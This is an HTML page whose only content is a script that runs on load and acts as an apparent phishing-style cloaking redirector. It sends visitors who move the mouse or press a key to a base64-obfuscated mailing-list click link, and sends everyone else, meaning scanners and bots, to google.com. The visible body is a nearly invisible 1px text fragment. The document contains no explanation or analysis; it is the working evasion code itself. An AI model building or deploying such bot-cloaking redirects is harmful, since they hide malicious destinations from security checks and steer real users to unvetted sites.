<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Insight</title>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const timeoutDuration = 3000; // 
      const mainUrl = "aHR0cHM6Ly9zZW1pLXpjbXAubWFpbGxpc3QtbWFuYWdlLmNvbS9jbGljay8xMTM0ZDFiNjk4ODU0NjJkZi8xMTM0ZDFiNjk4ODU0NWYyNw==";
      const botUrl = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";

      // 
      const decodeUrl = (encodedUrl) => atob(encodedUrl);

      const isHuman = () => {
        return new Promise((resolve) => {
          let interacted = false;

          const interactionListener = () => {
            interacted = true;
            resolve(true);
            // 
            window.removeEventListener("mousemove", interactionListener);
            window.removeEventListener("keydown", interactionListener);
          };

          //
          window.addEventListener("mousemove", interactionListener);
          window.addEventListener("keydown", interactionListener);

          //
          setTimeout(() => {
            if (!interacted) resolve(false);
          }, timeoutDuration);
        });
      };

      // Determine user type and redirect
      isHuman().then((human) => {
        const targetUrl = human ? decodeUrl(mainUrl) : decodeUrl(botUrl);
        window.location.href = targetUrl;
      }).catch((err) => {
        console.error("Error determining user type:", err);
        window.location.href = decodeUrl(botUrl); //
      });
    });
  </script>
</head>
<body>
  <p style="font-size: 1px;"> ello,Worl </p>
</body>
</html>
